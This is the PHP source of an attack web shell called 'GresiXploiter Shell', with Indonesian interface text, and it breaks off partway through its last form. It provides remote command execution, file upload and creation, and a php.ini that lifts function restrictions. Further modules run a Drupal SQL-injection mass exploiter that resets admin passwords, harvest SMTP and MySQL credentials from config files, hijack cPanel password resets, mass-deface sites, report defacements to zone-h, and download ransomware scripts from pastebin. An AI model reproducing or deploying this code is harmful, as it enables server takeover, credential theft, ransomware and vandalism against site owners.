<?php
//GresiXploiter Shell
//No Password No Encode
?>
<html>
<head>
<title>GresiXploiter ShelL 19</title>
<script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script> 
<script src='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.2.0/js/bootstrap.min.js'></script>
<script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
<meta name="description" content="GresiXploiter ShelL">
<link href="https://fonts.googleapis.com/css?family=Oxanium|Trade+Winds|Graduate|Joti+One|Rajdhani|Viaoda+Libre&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Girassol&display=swap" rel="stylesheet">
<meta name="theme-color" content="#b0d12a">
<meta name="viewport" content="width=1000, user-scalable=no">
<link rel="icon" href="https://s3.amazonaws.com/beatstarsdata/b.user.data/m/mikeyindacut-636672/gfx/cover-artwork/1759911_med_.jpg?_=1539390423">
<style>
@import url("https://fonts.googleapis.com/css?family=Gloria+Hallelujah");
body {
  font-family: Oxanium;
  background-color: #FFFAFA;
  color: white;
  font-size: 24px;
}

table {
  border: 3px solid black;
  width: 930px;
  height: 500px;
  border-radius: 21px;
}

th {
  background: black;
  border:black double;
  border-radius: 20px;
}

td {
  color: black;
  border-radius: 30px;
}

input[type=text], select {
  width: 600px;
  height: 40px;
  border: 3px solid black;
  font-family: Oxanium;
  font-size: 24px;
  color: black;
  border-radius: 10px;
}
.sc{
  width: 600px;
  height: 600px;
  border: 3px solid black;
  font-family: Oxanium;
  font-size: 24px;
  color: black;
  border-radius: 10px;
}

input[type=submit] {
  height: 45px;
  width: 250px;
  font-family: Oxanium;
  border:black solid;
  font-size: 25px;
  color: black;
  border-radius: 20px;
  background-color: #b0d12a;

}
.tusbol {
  height: 35px;
  width: 80px;
  font-family: Oxanium;
  border:black solid;
  font-size: 21px;
  color: black;
  border-radius: 20px;
  background-color: #b0d12a;

}
.tusbol:hover {
  height: 35px;
  width: 80px;
  font-family: Oxanium;
  border:black solid;
  font-size: 21px;
  color: white;
  border-radius: 20px;
  background-color: black;

}
.kotaksub {
  height: 45px;
  width: 30px;
  font-family: Oxanium;
  border:black solid;
  font-size: 25px;
  color: black;
  border-radius: 20px;
  background-color: #b0d12a;

}
input[type=submit]:hover {
  height: 45px;
  width: 250px;
  border: 2px black double;
  font-family: Oxanium;
  font-size: 25px;
  color: white;
  border-radius: 20px;
  background-color: black;
}

input[type=file] {
  height: 45px;
  background-color: transparent;
  font-family: Oxanium;
  font-size: 24px;
    position: relative;
    overflow: hidden;
    margin: 50px;
  border-radius: 10px;
}

textarea {
  height: 90px;
  width: 450px;
  border: 3px solid black;
  font-family: Oxanium;
  font-size: 25px;
  color: black;
  border-radius: 10px;
}
.cmd1 {
  height: 300px;
  width: 750px;
  border: 3px solid black;
  font-family: Oxanium;
  font-size: 24px;
  color: black;
  border-radius: 10px;
}
select{
  width: 150px;
  height: 25px;
  margin-top: 5px;
  font-family: Oxanium;
  font-size: 18px;
  height: 35px;
  border-radius: 25px;
}
.kecil {
  height: 45px;
  border: 3px solid black;
  margin-bottom: 25px;
}
a{
    font-size: 21px;
    font-family: Oxanium;
    text-decoration: none;
    color: #2F4F4F;
}
.tul{
    font-size: 27px;
    font-family: Oxanium;
    text-decoration: none;
    color: #00FF00;
}
.tul:hover{
    font-size: 23px;
    font-family: Oxanium;
    text-decoration: none;
    color: #00FF00;
}
.tombol{
  background-color: #b0d12a;
  border-top: 0;
  border-left: 0;
  border-right: 0;
  border-bottom: 5px solid white;
  border-radius: 7px;
  padding:10px 13px;
  color:black;
  margin: 3px;
  border-radius: 7px;
  padding:10px 13px;
  text-decoration:none;
  font-family:Rajdhani;
  font-size:20pt;
}
.tombol:hover{
  background-color: white;
  color:black;
  margin: 3px;
  border-top: 0;
  border-left: 0;
  border-right: 0;
  border-bottom: 5px solid white;
  border-radius: 7px;
  padding:10px 13px;
  text-decoration:none;
  font-family:Rajdhani;
  font-size:19pt;
}
.gx{
    font-size:70px;
    font-family: Rajdhani;
    text-align: center;
    color:red;
}
.g{
    font-size: 70px;
    font-family: Rajdhani;
    text-align: center;
    color: #00FF00;
}
.fa-link:before{content:"\f0c1"}.fa-linkedin:before{content:"\f08c"}.fa-linkedin-in:before{content:"\f0e1"}
</style>
</head>
<center>
<table><br>
<tr>
<th><br>
  <a class="tul" href="<?php echo basename($_SERVER['PHP_SELF']);?>">
            <font size="5px"><hr color="white"><hr color="#b0d12a"><font style="color: white; font-family: Trade Winds; font-size: 54px;">  &#9734; Gresi<font color="#b0d12a">X S</font>hell  &#9734;</font>
    <hr color="#b0d12a"><hr color="white"><br>
    <br>
<a href="?mrzhu=aboutust68reyfte4ytyer9ther87htherfy8hdy8gt8r8th8rht8hdrthrhr8ghrg78" class="tombol" style="text-decoration:none">&#8968; About Us &#8971;&nbsp;</font></a>
<a href="?mrzhu=encodee6w7tr7e6rgt7623trwgr73wrh23hru8hewhrfysbgfyug8t4785gtrgfyuhghghgf6ytr" class="tombol" style="text-decoration:none">&#8968; Encode &#8971;&nbsp;</font></a>&nbsp;&nbsp;&nbsp;&nbsp;
<a href="?mrzhu=decoder2tr7g23r732rg236723gr76wegyrgweygr7wegr7grewrwevfgfdgdftertdrte456" class="tombol" style="text-decoration:none">&#8968; Decode &#8971;</font></a>
<a href="?mrzhu=zone-hfsdfguisdgfwe78yr79ywerh43789t549w7teru9ther9t" class="tombol" style="text-decoration:none">&#8968; Zone- H &#8971;&nbsp;</font></a><br><br><br>
<a href="?mrzhu=ipcheck" class="tombol" style="text-decoration:none">&#8968; IP Check &#8971;&nbsp;</font></a>
<a href="?mrzhu=drupalreyt79eryferh8t73yt43theruihfteurht9y45yt" class="tombol" style="text-decoration:none">&#8968; Drupal Mass &#8971;&nbsp;</font></a>&nbsp;&nbsp;&nbsp;&nbsp;
</a><a href="?mrzhu=csrf" class="tombol" style="text-decoration:none">&#8968; CSRF Online &#8971;</font></a>
<a href="?mrzhu=newdirrg89erg895hthgr08g845ugjopergj90trjy8jtrghir" class="tombol" style="text-decoration:none">&#8968; New Dir &#8971;&nbsp;</font></a><br><br><br>
<a href="?mrzhu=newfileghhdr7ghr78tdrt9eher789yt78etheu8h75egn" class="tombol" style="text-decoration:none">&#8968; New File &#8971;&nbsp;</font></a>
<a href="?mrzhu=config7df8gy78erhgh9drhg8dehr89ehg8erhgehrg" class="tombol" style="text-decoration:none">&#8968; &nbsp;Config &#8971;&nbsp;</font></a>&nbsp;&nbsp;&nbsp;&nbsp;
<a href="?mrzhu=upload795hgh9reuhge5jhg094uyt380ty2348ty935ht35uy" class="tombol" style="text-decoration:none">&#8968; Upload &#8971;&nbsp;</font></a>
<a href="?mrzhu=phpinigweyrwe8grwe46rwe8g2368gr832gr2365r4f" class="tombol" style="text-decoration:none">&#8968; PHP.ini &#8971;&nbsp;</font></a><br><br><br>
<a href="?mrzhu=phpinfo4tr6f376gf37g4ywgfeyf78346f7gu8drhgidrgrgd" class="tombol" style="text-decoration:none">&#8968; PHP Info &#8971;&nbsp;</font></a>
<a href="?mrzhu=cmd68t34gtr346tgweutgf8euetrjetg834t6gg4et34t5" class="tombol" style="text-decoration:none">&#8968; Command &#8971;&nbsp;</font></a>&nbsp;&nbsp;&nbsp;&nbsp;
<a href="?mrzhu=ransometheht34795hy893469473t934bt34ntu934h5782345t34kotn34o" class="tombol" style="text-decoration:none">&#8968; Ransom &#8971;&nbsp;</font></a>
<a href="?mrzhu=cp4rt834ruhewr348tretyergt765e5ygte5gthrit78g45ty65yuu" class="tombol" style="text-decoration:none">&#8968; CP Reset &#8971;&nbsp;</font></a><br><br><br>
<a href="?mrzhu=massdefacehy743ufhruifhe74ytie475y945h9ty8jyui66yu56" class="tombol" style="text-decoration:none">&#8968; &nbsp;Mass Deface&nbsp; &#8971;&nbsp;&nbsp;</font></a>&nbsp;&nbsp;&nbsp;&nbsp;
<a href="?mrzhu=indexr8ge89rug7eyu79rehjg9erhge7ryter76g6e745g8e" class="tombol" style="text-decoration:none">&#8968; Auto Ngindex &#8971;&nbsp;</font></a>




<br><br><br></th>
</tr>
<td> 
<?php 

function exe($cmd) {    
if(function_exists('system')) {         
        @ob_start();        
        @system($cmd);      
        $buff = @ob_get_contents();         
        @ob_end_clean();        
        return $buff;   
    } elseif(function_exists('exec')) {         
        @exec($cmd,$results);       
        $buff = "";         
        foreach($results as $result) {          
            $buff .= $result;       
        } return $buff;     
    } elseif(function_exists('passthru')) {         
        @ob_start();        
        @passthru($cmd);        
        $buff = @ob_get_contents();         
        @ob_end_clean();        
        return $buff;   
    } elseif(function_exists('shell_exec')) {       
        $buff = @shell_exec($cmd);      
        return $buff;   
    } 
}
///////////////////////////////////////////////////////////////////
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));

if ($_GET['mrzhu']=='aboutust68reyfte4ytyer9ther87htherfy8hdy8gt8r8th8rht8hdrthrhr8ghrg78') {
  echo "<center><br><h2>About GresiXploiter</h2>";
  echo "<font size='5'>GresiXploiter adalah sebuah tim yang bergerak di bidang exploit, hacking <br>dan berbagai masalah di bidang IT. Tim ini didirikan oleh MrZhu404<br>sekaligus Leader dan Founder pada tanggal 02 Feb 2019.<br>
    Anggota dari tim ini berjumlah 53 orang.<br> Tertarik dengan tim kami ? Ambil aja kopiko :v<br><br><br><br>~ 100120 WR";
}

elseif ($_GET['mrzhu']=='encodee6w7tr7e6rgt7623trwgr73wrh23hru8hewhrfysbgfyug8t4785gtrgfyuhghghgf6ytr') {
  echo "<center><br>";
  echo "<font size=\"5\">Encode text to base64, uuencode, hex, and url";
  echo "<form method=post><br><input type=text name=txt placeholder=&nbsp;Text&nbsp;to&nbsp;encode>";
  echo "<br><br><input type=submit value=Encode!></form>";

  $enc = $_POST['txt'];
  $test = bin2hex($enc);
  $test = chunk_split($test,2,'%');
  $test = "%".substr($test, 0, strlen($test) - 1);  

  echo "<textarea placeholder=base64 style=\"width:350px; height:150px; font-size:18px; border-radius:16px;\">";
  echo  base64_encode($enc);
  echo "</textarea>"; 
  echo "&nbsp;<textarea placeholder=uuencode style=\"width:350px; height:150px; font-size:18px; border-radius:15px;\">";
  echo convert_uuencode($enc);
  echo "</textarea><br>";
  echo "<textarea placeholder=hek style=\"width:350px; height:150px; font-size:18px; border-radius:15px;\">";
  echo bin2hex($enc);
  echo "</textarea>";
  echo "&nbsp;<textarea placeholder=urlencode style=\"width:350px; height:150px; font-size:18px; border-radius:15px;\">";
  if ($_POST==true){
  echo "$test";
  }
  echo "</textarea><br>";

}

elseif ($_GET['mrzhu']=='decoder2tr7g23r732rg236723gr76wegyrgweygr7wegr7grewrwevfgfdgdftertdrte456') {
  echo "<center><br>";
  echo "<font size=\"5\">Decode text to base64, uuencode, hex, and url";
  echo "<form method=post><br><input type=text name=deco placeholder=&nbsp;Text&nbsp;to&nbsp;decode>";
  echo "<br><br><select name=pilih><option>base64</option><option>uuencode</option><option>hex</option><option>url</option></select>";
  echo "<br><br><input type=submit value=Decode!></form>";

  $decode = $_POST['deco'];
  $test = $_POST['pilih'];
  echo "<textarea  style=\"border:3px black solid; height: 300px; width:500px; border-radius:30px;\">";
  if ($test==base64){
    echo base64_decode($decode);
  } elseif ($test==uuencode) {
    echo convert_uudecode($decode);
  } elseif ($test==hex) {
    echo hex2bin($decode);
  } elseif ($test==url) {
    $satu = str_replace('%','',$decode);
    echo hex2bin($satu);
  }
  echo "</textarea><br>";

}

elseif ($_GET['mrzhu']=='csrf') {
  echo "<center><br>";
  echo "<form method=post><input type=text name=one placeholder=&nbsp;http://site.com/[path]/exploit required><br><br>";
  echo "<input type=text name=two placeholder=&nbsp;file,filename,files,file[],Filedata,qqfile required><br><br><input type=submit value=KLIK&nbsp;ME></form>";

  $post = $_POST['one'];
  $text = $_POST['two'];

if ($_POST==true){
  echo "<form method=post enctype=multipart/form-data mrzhuion=".$post.">";
  echo "<input type=file name=".$text.">";
  echo "<input type=submit value=Upload!>";
}
}

elseif ($_GET['mrzhu']=='ipcheck') {
  @set_time_limit(0);
   @error_reporting(0);
   function sws_domain_info($site)
   {
   $getip = @file_get_contents("http://networktools.nl/whois/$site");
   flush();
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_net_info($site)
   {
   $getip = @file_get_contents("http://networktools.nl/asinfo/$site");
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_site_ser($site)
   {
   $getip = @file_get_contents("http://networktools.nl/reverseip/$site");
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_sup_dom($site)
   {
   $getip = @file_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=".$site."&Search+subdomains=Find+subdomains");
   $ip = @findit($getip,'<strong>Nameservers found:</strong>','<script type="text/javascript">');
   return $ip;
   flush();
   }
   function sws_port_scan($ip)
   {
   $list_post = array('80','21','22','2082','25','53','110','443','143');
   foreach ($list_post as $o_port)
   {
   $connect = @fsockopen($ip,$o_port,$errno,$errstr,5);
   if($connect)
   {
   echo ' $ip : $o_port ??? <u style="color: blue">Open</u> <br /><br />';
   flush();
   }
   }
   }
   function findit($mytext,$starttag,$endtag) {
   $posLeft = @stripos($mytext,$starttag)+strlen($starttag);
   $posRight = @stripos($mytext,$endtag,$posLeft+1);
   return @substr($mytext,$posLeft,$posRight-$posLeft);
   flush();
   }
   echo '<br><br><center>';
   echo '
   <br />
   <form method="post"><input type="text" name="site" size="50" style="color:black;" class="inputz" placeholder="http://xnxx.com" /><br><br> <input class="inputzbut" type="submit" name="scan" value="Scan !" />
   </form></div>';
   if(isset($_POST['scan']))
   {
   $site = @htmlentities($_POST['site']);
   if (empty($site)){die('<br /><br /> Not add IP .. !');}
   $ip_port = @gethostbyname($site);
   echo "
  <br /><div class='sc2'><font size='5'>IP Dari $site adalah $ip_port </div>
  <div class='tit'> <br /><br />";
   }
    echo '</center>';
 
  
}
elseif ($_GET['mrzhu']=='drupalreyt79eryferh8t73yt43theruihfteurht9y45yt') {

echo "<div class='mybox'>
<center><br><h1>Drupal Mass Exploiter</h1><hr color='white'><br>
<form method='post' mrzhuion=''>
<textarea style=\"border:3px black solid; height: 300px; width:500px;\" name='url'>
http://www.target1.com
http://www.target2.com</textarea><br><br>
<input type='submit' class='tusbol' name='submit' value='SIKAT!'>
</form>
</div>
";
        $drupal = ($_GET["drupal"]);
        if ($drupal == 'drupal') {
            $filename = $_FILES['file']['name'];
            $filetmp = $_FILES['file']['tmp_name'];
            echo "<div class='mybox'><form method='POST' enctype='multipart/form-data'>
  <input type='file'name='file' />
  <input type='submit' value='drupal !' />
</form></div>";
            move_uploaded_file($filetmp, $filename);
        }
        error_reporting(0);
        if (isset($_POST['submit'])) {
            function exploit($url) {
                $post_data = "name[0;update users set name %3D 'berandal' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
                $params = array('http' => array('method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded
", 'content' => $post_data));
                $ctx = stream_context_create($params);
                $data = file_get_contents($url . '/user/login/', null, $ctx);
                if ((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'FcUk Crap') && $data)) {
                    $fp = fopen("exploited.txt", 'a+');
                    fwrite($fp, "<font size='5'>Exploitied  User: berandal Pass: berandal  =====> {$url}/user/login");
                    fwrite($fp, "
");
                    fwrite($fp, "--------------------------------------------------------------------------------------------------");
                    fwrite($fp, "
");
                    fclose($fp);
                    echo "<center><font size='5'><font color='#FDF105'>Success:<font color='white'>FirewalL21</font> Pass:<font color='white'>FirewalL21</font> =><a href='{$url}/user/login' target=_blank ><font color='green'> {$url}/user/login </font></a></font><br>";
                } else {
                    echo "<center><font color='red'><font size='5'>Failed => {$url}/user/login</font><br>";
                }
            }
            $urls = explode("
", $_POST['url']);
            foreach ($urls as $url) {
                $url = @trim($url);
                echo exploit($url);
            }
        }
 
}
elseif ($_GET['mrzhu']=='zone-hfsdfguisdgfwe78yr79ywerh43789t549w7teru9ther9t') {

if($_POST['submit']) {
        $domain = explode("\r\n", $_POST['url']);
        $nick =  $_POST['nick'];
        echo "<center>Defacer Onhold : <br><font size=3><a class=a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
        echo "<center>Defacer Archive: <br><font size=3><a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
        function zoneh($url,$nick) {
            $ch = curl_init("http://www.zone-h.com/notify/single");
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_setopt($ch, CURLOPT_POST, true);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
            return curl_exec($ch);
                  curl_close($ch);
        }
        foreach($domain as $url) {
            $zoneh = zoneh($url,$nick);
            if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
                echo "<center>$url -> <font color=#FDF105>OK</font><br>";
            } else {
                echo "<center>$url -> <font color=red>ERROR</font><br>";
            }
        }
    } else {
        echo "<center><form method='post'>
       <br><font size=5>Defacer : <br>
       <input type='text' name='nick' size='50' placeholder=&nbsp;Your&nbsp;nick><br><br>
       <font size=5>Domains : <br>
       <textarea style=\"border:3px black solid; height: 300px; width:500px; border-radius:10px; \" name='url' placeholder='http://site.go.aidi/'></textarea><br><br><br>
       <input type='submit' name='submit' value='GASKEUN !'>
       </form>";
    }
    echo "</center>";
  }
elseif ($_GET['mrzhu']=='newdirrg89erg895hthgr08g845ugjopergj90trjy8jtrghir') {
  echo "<center> <form method=post> <br> <input type=text name=filname placeholder='&nbsp;Folder&nbsp;Baru...'> <br></br><input type=submit name=creatdir value=BUAT&nbsp;FOLDER></center>";

        if (isset($_POST['creatdir']))
        {
          
          if(@mkdir(@$_POST['filname'])):
               print("<script>swal('OK ', 'Folder berhasil dibuat !', 'success')</script><center><font size=5> Folder Berhasil Dibuat ! </center>");

            endif;
        }
      }

elseif ($_GET['mrzhu']=='newfileghhdr7ghr78tdrt9eher789yt78etheu8h75egn') {

  echo "<center> <form method=post> <br> <input type=text name=filname placeholder='&nbsp;File&nbsp;Baru...' > <br></br><input type=submit name=creatfile value=BUAT&nbsp;FILE></center>";

        if (isset($_POST['creatfile']))
        {
          
          if(@fopen(@$_POST['filname'],"a")):
                 print("<script>swal('OK', 'File berhasil dibuat !', 'success')</script><center><font size=5> File Berhasil Dibuat ! </center>");
            endif;
        }
    }

elseif ($_GET['mrzhu']=='config7df8gy78erhgh9drhg8dehr89ehg8erhgehrg') {
   echo "<center><span><br><font size='5'>Nb : Tools ini akan berfungsi jika dijalankan di dalam folder <u> config </u><br> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
    function scj($dir) {
        $dira = scandir($dir);
        foreach($dira as $dirb) {
            if(!is_file("$dir/$dirb")) continue;
            $ambil = file_get_contents("$dir/$dirb");
            $ambil = str_replace("$", "", $ambil);
            if(preg_match("/JConfig|joomla/", $ambil)) {
                $smtp_host = ambilkata($ambil,"smtphost = '","'");
                $smtp_auth = ambilkata($ambil,"smtpauth = '","'");
                $smtp_user = ambilkata($ambil,"smtpuser = '","'");
                $smtp_pass = ambilkata($ambil,"smtppass = '","'");
                $smtp_port = ambilkata($ambil,"smtpport = '","'");
                $smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
                echo "SMTP Host: <font color=blue>$smtp_host</font><br>";
                echo "SMTP port: <font color=blue>$smtp_port</font><br>";
                echo "SMTP user: <font color=blue>$smtp_user</font><br>";
                echo "SMTP pass: <font color=blue>$smtp_pass</font><br>";
                echo "SMTP auth: <font color=blue>$smtp_auth</font><br>";
                echo "SMTP secure: <font color=blue>$smtp_secure</font><br><br>";
            }
        }
    }
    $smpt_hunter = scj($dir);
    echo $smpt_hunter;
  }

elseif ($_GET['mrzhu']=='upload795hgh9reuhge5jhg094uyt380ty2348ty935ht35uy') {
  echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<br><center><input type="file" name="file" ><br><br><input name="_upl" type="submit" id="_upl" value="Upload"></form><br>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo "<script>swal('OK', 'File Terupload !', 'success')</script><center><br><font size=5>File berhasil diupload !<br><br>"; }
else { echo "<center><br><font size=5>File gagal diupload cok !<br><br>"; }
}
}
?>
<?php
if ($_GET['mrzhu']=='phpinigweyrwe8grwe46rwe8g2368gr832gr2365r4f') {

echo "<br><form method=post>
<center><input type=submit name=ini value=\"Generate PHP.ini\" /></form>";
{

$r=fopen('php.ini','w');
$rr=" disable_functions=none ";
fwrite($r,$rr);
$link="<center><style>
    a {
    font-size: 23px;
    font-family: Oxanium;
    text-decoration: none;
    color: black;
}</style><br><a href=php.ini><font color=black style=\"text-decoration: none;\" size=5 face=\"comic sans ms\">Buka PHP.ini di jendela baru !</font></a>";
echo $link;

}
}

if ($_GET['mrzhu']=='phpinfo4tr6f376gf37g4ywgfeyf78346f7gu8drhgidrgrgd') {
echo '<br><center><font size=5><div class=content>';
    function showSecParam($n, $v) {
        $v = trim($v);
        if($v) {
            echo '<span>'.$n.': </span>';
            if(strpos($v, "\n") === false)
                echo $v.'<br>';
            else
                echo '<pre class=ml1>'.$v.'</pre>';
        }
    }
    
    showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    showSecParam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'none');
    showSecParam('Open base dir', @ini_get('open_basedir'));
    showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
    showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
    showSecParam('cURL support', function_exists('curl_version')?'enabled':'none');
    $temp=array();
    if(function_exists('mysql_get_client_info'))
        $temp[] = "MySql (".mysql_get_client_info().")";
    if(function_exists('mssql_connect'))
        $temp[] = "MSSQL";
    if(function_exists('pg_connect'))
        $temp[] = "PostgreSQL";
    if(function_exists('oci_connect'))
        $temp[] = "Oracle";
    showSecParam('Supported databases', implode(', ', $temp));
    echo '<br></font>';
  }
if ($_GET['mrzhu']=='cmd68t34gtr346tgweutgf8euetrjetg834t6gg4et34t5') {
  echo "<center><form method='post'><br>
    <font style='text-decoration: none;' size=5>".$user."@".gethostbyname($_SERVER['HTTP_HOST']).":~# </font>
    <input type='text' size='30' height='10' name='cmd'><br><br><input type='submit' name='do_cmd' class='kotak' value='EKSEKUSI'>
    </form></center>";
    if($_POST['do_cmd']) {
        echo "<center><textarea class=\"cmd1\">".exe($_POST['cmd'])."</textarea>";
        echo "";
        
    }
}
if ($_GET['mrzhu']=='ransometheht34795hy893469473t934bt34ntu934h5782345t34kotn34o') {

  $url  = "https://pastebin.com/raw/LbVhNnZF";
  $url2  = "https://pastebin.com/raw/LUuyThja";
  $curl = curl_init($url);
          curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
  $get  = curl_exec($curl);
  $curli = curl_init($url2);
          curl_setopt($curli, CURLOPT_RETURNTRANSFER,true);
  $geta  = curl_exec($curli);
 if(!$get == ""){
  //MEMBUAT FILE RANSOM
$puts = fopen("RansomWeb.php","w");
        fwrite($puts,$get);
        fclose($puts);
$nama_file  = "RansomWeb.php";
$server_web = 'http://'.$_SERVER["HTTP_HOST"].'/';
if($puts == true)
if(!$geta == ""){
  //MEMBUAT FILE RANSOM
$putsa = fopen("keep-alive.php","w");
        fwrite($putsa,$geta);
        fclose($putsa);
$nama_file  = "keep-alive.php";
$server_web = 'http://'.$_SERVER["HTTP_HOST"].'/';
if($puts == true)
{
  echo "<br><center><font size=5>Sukses Boss ! Silahkan Akses Dengan Nama<br> /RansomWeb.php !<br>";
}else{
  echo "<br><center><font size=5>Gagal Membuat File !<br>";
  }
}else{
  echo "<br><center><font size=5>Not Found !!!<br>";
}
}
}
if ($_GET['mrzhu']=='cp4rt834ruhewr348tretyergt765e5ygte5gthrit78g45ty65yuu') {

echo "<center><br><form action=\"#\" method=\"post\">
    <font size=5> Email Luh : </font>
    <input type=\"text\" name=\"email\" required/><br><br>
    <input type=\"submit\" name=\"submit\" value=\"Send\" />

    </form>";
    echo "<font color=black size=5>";
  $user = get_current_user();
  $site = $_SERVER['HTTP_HOST'];
  $ips = getenv('REMOTE_ADDR');

  if(isset($_POST['submit'])){

    $email = $_POST['email'];
    $wr = $email;
  $f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
  fwrite($f, $wr);
  fclose($f);
  $f = fopen('/home/'.$user.'/.contactemail', 'w');
  fwrite($f, $wr);
  fclose($f);
  $parm = $site.':2083/resetpass?start=1';
  echo '<br/><center><font size=5>Akses Disini : '.$parm.'</center>';
  }
}

if ($_GET['mrzhu']=='massdefacehy743ufhruifhe74ytie475y945h9ty8jyui66yu56') {
  echo "<center><form method='POST'><br>";
echo "<font size=5>Tempat File : <br><input type='text' name='base_dir' size='50' value='".getcwd ()."'><br><br>";
echo "<font size=5>Nama File : <br><input type='text' name='file_name' value='index.php'><br><br>";
echo "<font size=5>Script Deface Luh : <br><textarea style=' font-size:14px;width: 685px; height: 330px; border-radius:17px;' name='index'>Hacked By MrZhu404</textarea><br>";
echo "<br><input type='submit' value='Semprot !'></form></center>";
  if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." Not Found !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Is Not A Directory !<br>");
 
        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
 
        $files = @scandir ($_POST['base_dir']) or die ("oohhh shet<br>");
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['file_name'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: green'>OK</span><br>";
                }
        endforeach;
}
}
if ($_GET['mrzhu']=='cp74gtefhy784gfreygfubrit78g49tye47ty45t789reh45uh') {

echo "<center>";
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");
 
if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();
 
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a href='http://".$domain.":2082' target='_blank'>".$domain."</a></td><td>".$owner['name']."</td><td>".$password."</td><td><a href='".$owner['name'].".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
}
 
}
}
echo '</table>';
$total = $dc;
echo '<br><div class="result">Total cPanel yang ditemukan = '.$total.'</h3><br />';
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td>'.$r."</td><td>".$password."</td><td><a href='".$r.".txt' target='_blank'>Gass Disini !!!</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
                }
            }
            }
echo '</table>';
$total = $dc;
echo '<br><div class="result"><font size=5>Total cPanel Yang Ketemu = '.$total.'</h3><br />';
echo '</center>';
 
}
}else{
echo "<div class='result'><i><br><font color='#FF0000' size='5'>ERROR</font><br><font color='#FF0000' size='5'>/var/named</font><font size='5'> atau <font color='#FF0000' size='5'>etc/named.conf</font><font size='5'> Tidak ditemukan !</i></div>";
}
echo "</body></html>";

}
if ($_GET['mrzhu']=='indexr8ge89rug7eyu79rehjg9erhge7ryter76g6e745g8e') {
  echo "<center><br><form action=\"#\" method=\"post\">
    <font size=5> Script Luh : </font><br><br>
    <textarea style=\"width: 500px; height: 500px; font-size:24px;\" name=\"indexnya\" placeholder=Masukan&nbsp;Script&nbsp;Depes&nbsp;Luh... required/></textarea><br><br>
